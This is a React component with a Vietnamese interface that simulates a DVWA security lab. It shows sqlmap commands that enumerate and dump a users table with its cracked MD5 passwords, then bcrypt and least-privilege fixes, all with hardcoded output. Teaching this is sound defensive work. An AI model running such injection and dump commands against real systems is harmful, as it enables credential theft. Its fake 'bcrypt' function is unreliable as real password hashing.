"use client";

import { KeyboardEvent, useEffect, useRef, useState } from "react";
import {
  Database,
  KeyRound,
  Play,
  RotateCcw,
  ShieldCheck,
  Terminal,
} from "lucide-react";
import { WindowControls } from "@/components/WindowBar";

interface Props {
  containerRef: string;
  phpsessid: string;
  activeTab?: string;
}

interface UserRow {
  user_id: number;
  user: string;
  md5: string;
  plain: string;
}

const INITIAL_USERS: UserRow[] = [
  {
    user_id: 1,
    user: "admin",
    md5: "5f4dcc3b5aa765d61d8327deb882cf99",
    plain: "password",
  },
  {
    user_id: 2,
    user: "gordonb",
    md5: "e99a18c428cb38d5f260853678922e03",
    plain: "abc123",
  },
  {
    user_id: 3,
    user: "1337",
    md5: "8d3533d75ae2c3966d7e0d4fcc69216b",
    plain: "charley",
  },
  {
    user_id: 4,
    user: "pablo",
    md5: "0d107d09f5bbe40cade3de5c71e9e9b7",
    plain: "letmein",
  },
  {
    user_id: 5,
    user: "smithy",
    md5: "5f4dcc3b5aa765d61d8327deb882cf99",
    plain: "password",
  },
];

const BCRYPT_ALPHABET =
  "./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

function generateRealisticBcrypt(input: string, cost: number, seedShift: number): {
  full: string;
  salt: string;
  digest: string;
} {
  let acc = seedShift + cost * 17;
  for (let i = 0; i < input.length; i++) {
    acc = (acc * 31 + input.charCodeAt(i)) % 1000000007;
  }

  let salt = "";
  let s = acc;
  for (let i = 0; i < 22; i++) {
    s = (s * 48271 + 7919) % 2147483647;
    salt += BCRYPT_ALPHABET[s % BCRYPT_ALPHABET.length];
  }

  let digest = "";
  for (let i = 0; i < 31; i++) {
    s = (s * 48271 + 104729) % 2147483647;
    digest += BCRYPT_ALPHABET[s % BCRYPT_ALPHABET.length];
  }

  return {
    full: `$2y$${String(cost).padStart(2, "0")}$${salt}${digest}`,
    salt,
    digest,
  };
}

function deterministicPseudoMd5(input: string): string {
  if (input === "password") return "5f4dcc3b5aa765d61d8327deb882cf99";
  if (input === "abc123") return "e99a18c428cb38d5f260853678922e03";
  if (input === "charley") return "8d3533d75ae2c3966d7e0d4fcc69216b";
  if (input === "letmein") return "0d107d09f5bbe40cade3de5c71e9e9b7";
  let h1 = 0x9e3779b9;
  let h2 = 0x85ebca6b;
  for (let i = 0; i < input.length; i++) {
    h1 = Math.imul(h1 ^ input.charCodeAt(i), 0x45d9f3b);
    h2 = Math.imul(h2 ^ (input.charCodeAt(i) + i), 0x27d4eb2f);
  }
  const part = (n: number) => (n >>> 0).toString(16).padStart(8, "0");
  return `${part(h1)}${part(h2)}${part(h1 ^ h2)}${part(h1 + h2)}`;
}

export function Member3Simulator({ containerRef, phpsessid, activeTab }: Props) {
  const [tab, setTab] = useState<"sqlmap" | "mariadb">(
    activeTab === "m3-mariadb-patch" ? "mariadb" : "sqlmap"
  );
  const [sqlmapStage, setSqlmapStage] = useState<1 | 2 | 3>(1);
  const [isScanning, setIsScanning] = useState(false);
  const [isSequenceRunning, setIsSequenceRunning] = useState(false);

  const [bcryptApplied, setBcryptApplied] = useState(false);
  const [leastPrivApplied, setLeastPrivApplied] = useState(false);

  // Bcrypt Salt & Cost Lab
  const [labPassword, setLabPassword] = useState("password");
  const [bcryptCost, setBcryptCost] = useState<10 | 12 | 14>(12);
  const [saltNonce, setSaltNonce] = useState(1);

  // MariaDB Interactive Console
  const [sqlInput, setSqlInput] = useState(
    "SELECT user_id, user, password FROM users;"
  );
  const [sqlOutput, setSqlOutput] = useState<string | null>(null);

  const timersRef = useRef<ReturnType<typeof setTimeout>[]>([]);

  const container = containerRef.trim() || "dvwa";
  const session = phpsessid.trim() || "7nst0hrqrfmv744a5ouj7663b0";

  useEffect(() => {
    return () => {
      timersRef.current.forEach(clearTimeout);
    };
  }, []);

  const clearTimers = () => {
    timersRef.current.forEach(clearTimeout);
    timersRef.current = [];
  };

  const handleStageSelect = (stage: 1 | 2 | 3) => {
    clearTimers();
    setIsSequenceRunning(false);
    setSqlmapStage(stage);
    setIsScanning(true);
    const t = setTimeout(() => {
      setIsScanning(false);
    }, 350);
    timersRef.current.push(t);
  };

  const handleRunSequence = () => {
    clearTimers();
    setIsSequenceRunning(true);
    setSqlmapStage(1);
    setIsScanning(true);

    timersRef.current.push(setTimeout(() => setIsScanning(false), 320));
    timersRef.current.push(
      setTimeout(() => {
        setSqlmapStage(2);
        setIsScanning(true);
      }, 1100)
    );
    timersRef.current.push(setTimeout(() => setIsScanning(false), 1450));
    timersRef.current.push(
      setTimeout(() => {
        setSqlmapStage(3);
        setIsScanning(true);
      }, 2250)
    );
    timersRef.current.push(
      setTimeout(() => {
        setIsScanning(false);
        setIsSequenceRunning(false);
      }, 2650)
    );
  };

  const runSqlCommand = (rawSql?: string) => {
    const query = (rawSql ?? sqlInput).trim();
    if (!query) return;
    const lower = query.toLowerCase();

    if (lower.includes("grants")) {
      if (!leastPrivApplied) {
        setSqlOutput(
          "ERROR 1141 (42000): There is no such grant defined for user 'dvwa_svc' on host 'localhost'\n(Gợi ý: Bấm nút 'Thực thi Vá lỗi 2: Tạo User dvwa_svc' phía trên trước khi kiểm tra)"
        );
      } else {
        setSqlOutput(`+--------------------------------------------------------------------------------+
| Grants for dvwa_svc@localhost                                                  |
+--------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'dvwa_svc'@'localhost' IDENTIFIED BY PASSWORD ...        |
| GRANT SELECT, INSERT, UPDATE ON \`dvwa\`.\`users\` TO 'dvwa_svc'@'localhost'       |
+--------------------------------------------------------------------------------+
2 rows in set (0.00 sec)`);
      }
      return;
    }

    if (lower.includes("show tables")) {
      setSqlOutput(`+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
2 rows in set (0.00 sec)`);
      return;
    }

    if (lower.includes("select user()")) {
      setSqlOutput(`+----------------+
| USER()         |
+----------------+
| ${leastPrivApplied ? "dvwa_svc@localhost" : "root@localhost   "} |
+----------------+
1 row in set (0.00 sec)`);
      return;
    }

    if (lower.includes("from users") || lower.includes("select")) {
      const adminHash = bcryptApplied
        ? "$2y$12$K9p8Q3vT2xL7wR4mN6zA1eH8cB5vD0fG2jK4lM6nP8qR0sT2uV4wX"
        : "5f4dcc3b5aa765d61d8327deb882cf99                     ";
      const smithyHash = bcryptApplied
        ? "$2y$12$zQ7mL1vN8pR3tX5wK2cF9uB6dG4hJ0kM2nP8qS5tV1yZ7aC3eI9oU"
        : "5f4dcc3b5aa765d61d8327deb882cf99                     ";

      setSqlOutput(`+---------+---------+--------------------------------------------------------------+
| user_id | user    | password                                                     |
+---------+---------+--------------------------------------------------------------+
|       1 | admin   | ${adminHash} |
|       2 | gordonb | e99a18c428cb38d5f260853678922e03                             |
|       3 | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b                             |
|       4 | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7                             |
|       5 | smithy  | ${smithyHash} |
+---------+---------+--------------------------------------------------------------+
5 rows in set (0.00 sec)`);
      return;
    }

    setSqlOutput(
      `MariaDB [dvwa]: Đã tiếp nhận câu lệnh '${query}'. Thử các lệnh mẫu: SELECT user_id, user, password FROM users; | SHOW TABLES; | SHOW GRANTS FOR 'dvwa_svc'@'localhost';`
    );
  };

  const handleSqlKeyDown = (e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      e.preventDefault();
      runSqlCommand();
    }
  };

  const md5Demo = deterministicPseudoMd5(labPassword);
  const bcryptRun1 = generateRealisticBcrypt(labPassword, bcryptCost, saltNonce * 101);
  const bcryptRun2 = generateRealisticBcrypt(labPassword, bcryptCost, saltNonce * 997 + 33);

  return (
    <div className="rounded-lg border border-hairline bg-surface p-4 sm:p-5">
      <div className="mb-4 flex flex-wrap items-center justify-between gap-3 border-b border-hairline pb-3">
        <div>
          <h3 className="flex items-center gap-2 text-sm font-bold text-ink sm:text-base">
            <Database className="h-4 w-4 text-accent" aria-hidden="true" />
            Interactive Console — Quyết (Laptop Ubuntu VM 2 · SQLMap &amp; MariaDB Live Patching)
          </h3>
          <p className="text-xs text-muted">
            Chạy tuần tự chuỗi 3 lệnh SQLMap, kiểm chứng Salt ngẫu nhiên Bcrypt và truy vấn trực tiếp trên MariaDB CLI.
          </p>
        </div>

        <div className="inline-flex rounded-md border border-hairline bg-subtle p-0.5 text-xs">
          <button
            type="button"
            onClick={() => setTab("sqlmap")}
            className={`cursor-pointer rounded px-3 py-1 font-medium transition-colors ${
              tab === "sqlmap"
                ? "bg-surface font-semibold text-ink shadow-sm"
                : "text-muted hover:text-ink"
            }`}
          >
            1. SQLMap 3 Lệnh
          </button>
          <button
            type="button"
            onClick={() => setTab("mariadb")}
            className={`cursor-pointer rounded px-3 py-1 font-medium transition-colors ${
              tab === "mariadb"
                ? "bg-surface font-semibold text-ink shadow-sm"
                : "text-muted hover:text-ink"
            }`}
          >
            2. MariaDB, Bcrypt Lab &amp; Vá lỗi
          </button>
        </div>
      </div>

      {tab === "sqlmap" ? (
        <div className="space-y-4">
          <div className="flex flex-wrap items-center gap-2">
            {[
              { id: 1 as const, label: "Lệnh 1: --dbs" },
              { id: 2 as const, label: "Lệnh 2: -D dvwa --tables" },
              { id: 3 as const, label: "Lệnh 3: -T users --dump" },
            ].map((s) => (
              <button
                key={s.id}
                type="button"
                onClick={() => handleStageSelect(s.id)}
                className={`inline-flex cursor-pointer items-center gap-1.5 rounded-md border px-3 py-1.5 font-mono text-xs transition-colors ${
                  sqlmapStage === s.id
                    ? "border-ink bg-ink font-semibold text-canvas"
                    : "border-hairline bg-subtle text-secondary hover:text-ink"
                }`}
              >
                <Play className="h-3 w-3" aria-hidden="true" />
                {s.label}
              </button>
            ))}

            <button
              type="button"
              onClick={handleRunSequence}
              disabled={isSequenceRunning}
              className="ml-auto inline-flex cursor-pointer items-center gap-1.5 rounded-md bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white transition-opacity hover:opacity-90 disabled:opacity-60"
            >
              <Play className="h-3 w-3" aria-hidden="true" />
              {isSequenceRunning ? `Đang chạy bước ${sqlmapStage}/3...` : "Chạy Tuần tự 3 Lệnh"}
            </button>
          </div>

          <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-4 font-mono text-xs leading-relaxed text-zinc-200">
            <div className="mb-2 flex items-center justify-between border-b border-zinc-800 pb-2 text-zinc-400">
              <div className="flex items-center gap-2.5">
                <WindowControls />
                <span className="text-zinc-500">quyet@ubuntu-vm:~$</span>{" "}
                <span className="font-semibold text-emerald-300">
                  sqlmap -u &quot;http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID={session.slice(0, 8)}...&quot;{" "}
                  {sqlmapStage === 1 && "--dbs --batch"}
                  {sqlmapStage === 2 && "-D dvwa --tables --batch"}
                  {sqlmapStage === 3 && "-D dvwa -T users --dump --batch"}
                </span>
              </div>
              <span className="text-[10px] text-zinc-500">sqlmap/1.8.4</span>
            </div>

            {isScanning ? (
              <div className="py-8 text-center text-amber-400">
                Đang chạy bước {sqlmapStage}/3 và phân tích cấu trúc MariaDB...
              </div>
            ) : (
              <>
                {sqlmapStage === 1 && (
                  <pre className="overflow-x-auto leading-relaxed text-zinc-200">
{`[INFO] testing connection to the target URL
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (DBMS: 'MySQL')
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] the back-end DBMS is MySQL (MariaDB fork)
available databases [2]:
[*] dvwa
[*] information_schema

[✓] Hoàn thành Lệnh 1: Phát hiện 2 CSDL đích.`}
                  </pre>
                )}

                {sqlmapStage === 2 && (
                  <pre className="overflow-x-auto leading-relaxed text-zinc-200">
{`[INFO] fetching tables for database: 'dvwa'
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+

[✓] Hoàn thành Lệnh 2: Phát hiện bảng nhạy cảm 'users'.`}
                  </pre>
                )}

                {sqlmapStage === 3 && (
                  <pre className="overflow-x-auto leading-relaxed text-amber-200">
{`[INFO] fetching entries for table 'users' in database 'dvwa'
[INFO] recognized possible password hashes in column 'password'
[INFO] dictionary-based attack against column 'password' with wordlist.txt
[100%] [================================] 5/5 hashes parsed

Database: dvwa
Table: users
[5 entries]
+---------+---------+--------------------------------------------+
| user_id | user    | password (cleartext)                       |
+---------+---------+--------------------------------------------+
| 1       | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| 2       | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 3       | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------+--------------------------------------------+
[✓] Hoàn thành Lệnh 3: Toàn bộ mật khẩu MD5 không Salt đã bị bẻ khóa qua từ điển!`}
                  </pre>
                )}
              </>
            )}
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          <div className="flex flex-wrap items-center gap-2">
            <button
              type="button"
              onClick={() => setBcryptApplied(true)}
              className="inline-flex cursor-pointer items-center gap-1.5 rounded-md bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-emerald-700"
            >
              <KeyRound className="h-3.5 w-3.5" aria-hidden="true" />
              Thực thi Vá lỗi 1: Băm Bcrypt (cost=12)
            </button>
            <button
              type="button"
              onClick={() => setLeastPrivApplied(true)}
              className="inline-flex cursor-pointer items-center gap-1.5 rounded-md bg-accent px-3 py-1.5 text-xs font-semibold text-white hover:opacity-90"
            >
              <ShieldCheck className="h-3.5 w-3.5" aria-hidden="true" />
              Thực thi Vá lỗi 2: Tạo User dvwa_svc (Least Privilege)
            </button>
            {(bcryptApplied || leastPrivApplied) && (
              <button
                type="button"
                onClick={() => {
                  setBcryptApplied(false);
                  setLeastPrivApplied(false);
                  setSqlOutput(null);
                }}
                className="inline-flex cursor-pointer items-center gap-1 rounded-md border border-hairline bg-subtle px-3 py-1.5 text-xs text-secondary hover:text-ink"
              >
                <RotateCcw className="h-3 w-3" aria-hidden="true" /> Reset về mặc định
              </button>
            )}
          </div>

          {/* Interactive MariaDB Table View */}
          <div className="overflow-x-auto rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5">
            <div className="mb-2 flex items-center justify-between border-b border-zinc-800/80 pb-2">
              <div className="flex items-center gap-2.5">
                <WindowControls />
                <span className="font-mono text-xs text-zinc-300">
                  root@{container}:/# mysql -u root -e &quot;USE dvwa; SELECT user_id, user, password FROM users;&quot;
                </span>
              </div>
              <span className="font-mono text-[10px] text-zinc-500">MariaDB 10.x</span>
            </div>
            <table className="w-full text-left font-mono text-xs">
              <thead>
                <tr className="border-b border-zinc-800 text-zinc-400">
                  <th className="px-2 py-1.5">user_id</th>
                  <th className="px-2 py-1.5">user</th>
                  <th className="px-2 py-1.5">
                    password ({bcryptApplied ? "Bcrypt Salted (cost=12)" : "MD5 Unsalted"})
                  </th>
                  <th className="px-2 py-1.5">Trạng thái bảo mật</th>
                </tr>
              </thead>
              <tbody>
                {INITIAL_USERS.map((u) => {
                  const isDupMd5 = u.user_id === 1 || u.user_id === 5;
                  const displayHash =
                    bcryptApplied && u.user_id === 1
                      ? "$2y$12$K9p8Q3vT2xL7wR4mN6zA1eH8cB5vD0fG2jK4lM6nP8qR0sT2uV4wX"
                      : bcryptApplied && u.user_id === 5
                      ? "$2y$12$zQ7mL1vN8pR3tX5wK2cF9uB6dG4hJ0kM2nP8qS5tV1yZ7aC3eI9oU"
                      : u.md5;

                  return (
                    <tr
                      key={u.user_id}
                      className={`border-b border-zinc-800/60 ${
                        !bcryptApplied && isDupMd5 ? "bg-rose-950/25" : ""
                      }`}
                    >
                      <td className="px-2 py-1.5 text-zinc-300">{u.user_id}</td>
                      <td className="px-2 py-1.5 font-semibold text-zinc-100">{u.user}</td>
                      <td
                        className={`break-all px-2 py-1.5 ${
                          bcryptApplied
                            ? "text-emerald-300"
                            : isDupMd5
                            ? "text-rose-300"
                            : "text-amber-200"
                        }`}
                      >
                        {displayHash}
                      </td>
                      <td className="px-2 py-1.5 font-sans text-[11px]">
                        {bcryptApplied ? (
                          <span className="rounded bg-emerald-500/20 px-1.5 py-0.5 font-semibold text-emerald-300">
                            Salt ngẫu nhiên 128-bit · Chống Rainbow Table
                          </span>
                        ) : isDupMd5 ? (
                          <span className="rounded bg-rose-500/20 px-1.5 py-0.5 font-bold text-rose-300">
                            Trùng hash MD5 (&quot;{u.plain}&quot;) · Lỗi CWE-759
                          </span>
                        ) : (
                          <span className="text-zinc-400">MD5 32-hex không Salt</span>
                        )}
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>

          {/* Bcrypt Salt & Cost Lab */}
          <div className="rounded-lg border border-hairline bg-subtle p-4">
            <div className="mb-3 flex flex-wrap items-center justify-between gap-2">
              <div>
                <div className="text-xs font-bold text-ink sm:text-sm">
                  Phòng Thí nghiệm Salt &amp; Bcrypt Cost (Giải phẫu Mã băm)
                </div>
                <p className="text-xs text-muted">
                  Nhập cùng 1 mật khẩu để đối chiếu MD5 tĩnh với 2 chuỗi Bcrypt khác nhau hoàn toàn nhờ Salt ngẫu nhiên 22 ký tự.
                </p>
              </div>
              <button
                type="button"
                onClick={() => setSaltNonce((n) => n + 1)}
                className="inline-flex cursor-pointer items-center gap-1.5 rounded-md border border-hairline bg-surface px-3 py-1.5 text-xs font-semibold text-ink hover:bg-canvas"
              >
                <RotateCcw className="h-3 w-3" aria-hidden="true" /> Sinh Salt ngẫu nhiên mới
              </button>
            </div>

            <div className="mb-3 flex flex-wrap items-center gap-3">
              <div className="flex items-center gap-2">
                <label htmlFor="bcrypt-pw" className="font-mono text-xs text-muted">
                  Mật khẩu:
                </label>
                <input
                  id="bcrypt-pw"
                  type="text"
                  value={labPassword}
                  onChange={(e) => setLabPassword(e.target.value)}
                  className="rounded-md border border-hairline bg-surface px-2.5 py-1 font-mono text-xs text-ink focus:border-accent focus:outline-none"
                />
              </div>

              <div className="flex items-center gap-1.5">
                <span className="font-mono text-xs text-muted">Cost factor:</span>
                {([10, 12, 14] as const).map((c) => (
                  <button
                    key={c}
                    type="button"
                    onClick={() => setBcryptCost(c)}
                    className={`cursor-pointer rounded border px-2 py-0.5 font-mono text-xs ${
                      bcryptCost === c
                        ? "border-ink bg-ink font-semibold text-canvas"
                        : "border-hairline bg-surface text-secondary"
                    }`}
                  >
                    cost={c} ({Math.pow(2, c).toLocaleString()} vòng)
                  </button>
                ))}
              </div>
            </div>

            <div className="space-y-2 rounded-md border border-zinc-800 bg-[#0d1117] p-3 font-mono text-xs">
              <div className="flex flex-wrap items-center gap-2 text-rose-300">
                <span className="w-36 shrink-0 text-zinc-400">MD5 (Không Salt):</span>
                <span className="break-all font-bold">{md5Demo}</span>
                <span className="text-[11px] text-rose-400">(Luôn cố định cho mọi tài khoản)</span>
              </div>

              <div className="flex flex-wrap items-center gap-2">
                <span className="w-36 shrink-0 text-zinc-400">Bcrypt (admin):</span>
                <span className="break-all">
                  <span className="text-sky-400">$2y$</span>
                  <span className="text-amber-300">{String(bcryptCost).padStart(2, "0")}$</span>
                  <span className="text-emerald-300">{bcryptRun1.salt}</span>
                  <span className="text-zinc-200">{bcryptRun1.digest}</span>
                </span>
              </div>

              <div className="flex flex-wrap items-center gap-2">
                <span className="w-36 shrink-0 text-zinc-400">Bcrypt (smithy):</span>
                <span className="break-all">
                  <span className="text-sky-400">$2y$</span>
                  <span className="text-amber-300">{String(bcryptCost).padStart(2, "0")}$</span>
                  <span className="text-emerald-300">{bcryptRun2.salt}</span>
                  <span className="text-zinc-200">{bcryptRun2.digest}</span>
                </span>
              </div>

              <div className="flex flex-wrap gap-3 border-t border-zinc-800 pt-2 text-[11px] text-zinc-400">
                <span>
                  <span className="font-bold text-sky-400">$2y$</span> = Thuật toán Bcrypt PHP
                </span>
                <span>
                  <span className="font-bold text-amber-300">{bcryptCost}$</span> = Số vòng lặp 2^{bcryptCost}
                </span>
                <span>
                  <span className="font-bold text-emerald-300">22 ký tự</span> = Salt ngẫu nhiên riêng biệt
                </span>
              </div>
            </div>
          </div>

          {/* Interactive MariaDB CLI Console */}
          <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5 font-mono text-xs text-zinc-200">
            <div className="mb-2.5 flex flex-wrap items-center justify-between gap-2 border-b border-zinc-800 pb-2">
              <div className="flex items-center gap-2.5">
                <WindowControls onClose={() => setSqlOutput(null)} closeTitle="Xóa kết quả SQL" />
                <Terminal className="h-3.5 w-3.5 text-zinc-400" aria-hidden="true" />
                <span className="font-bold text-zinc-200">MariaDB [dvwa] Interactive CLI</span>
              </div>
              <div className="flex flex-wrap gap-1.5">
                {[
                  "SELECT user_id, user, password FROM users;",
                  "SHOW TABLES;",
                  "SHOW GRANTS FOR 'dvwa_svc'@'localhost';",
                  "SELECT USER();",
                ].map((preset) => (
                  <button
                    key={preset}
                    type="button"
                    onClick={() => {
                      setSqlInput(preset);
                      runSqlCommand(preset);
                    }}
                    className="cursor-pointer rounded border border-zinc-700 bg-zinc-800 px-2 py-0.5 text-[10px] text-zinc-300 hover:bg-zinc-700"
                  >
                    {preset.split(" ")[0]} {preset.split(" ")[1]}
                  </button>
                ))}
              </div>
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <span className="text-emerald-400">MariaDB [dvwa]&gt;</span>
              <input
                type="text"
                value={sqlInput}
                onChange={(e) => setSqlInput(e.target.value)}
                onKeyDown={handleSqlKeyDown}
                aria-label="Nhập câu lệnh SQL MariaDB"
                className="min-w-[200px] flex-1 bg-transparent text-zinc-100 focus:outline-none"
              />
              <button
                type="button"
                onClick={() => runSqlCommand()}
                className="cursor-pointer rounded bg-emerald-600 px-2.5 py-1 text-[11px] font-semibold text-white hover:bg-emerald-700"
              >
                Thực thi SQL
              </button>
            </div>

            {sqlOutput && (
              <pre className="mt-2.5 overflow-x-auto rounded border border-zinc-800/80 bg-[#05070a] p-2.5 text-emerald-300">
                {sqlOutput}
              </pre>
            )}
          </div>

          {leastPrivApplied && (
            <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-3.5 font-mono text-xs text-emerald-300">
              <div className="mb-2 flex items-center justify-between border-b border-zinc-800/80 pb-2">
                <div className="flex items-center gap-2.5">
                  <WindowControls />
                  <span className="font-sans text-xs font-bold text-zinc-200">
                    SHOW GRANTS FOR &apos;dvwa_svc&apos;@&apos;localhost&apos;:
                  </span>
                </div>
              </div>
              <pre className="overflow-x-auto">
{`+--------------------------------------------------------------------------------+
| Grants for dvwa_svc@localhost                                                  |
+--------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'dvwa_svc'@'localhost' IDENTIFIED BY PASSWORD ...        |
| GRANT SELECT, INSERT, UPDATE ON \`dvwa\`.\`users\` TO 'dvwa_svc'@'localhost'       |
+--------------------------------------------------------------------------------+
2 rows in set (0.00 sec)
# KẾT QUẢ: Đã tước quyền DROP TABLE, ALTER TABLE, FILE và GRANT của ứng dụng web.`}
              </pre>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
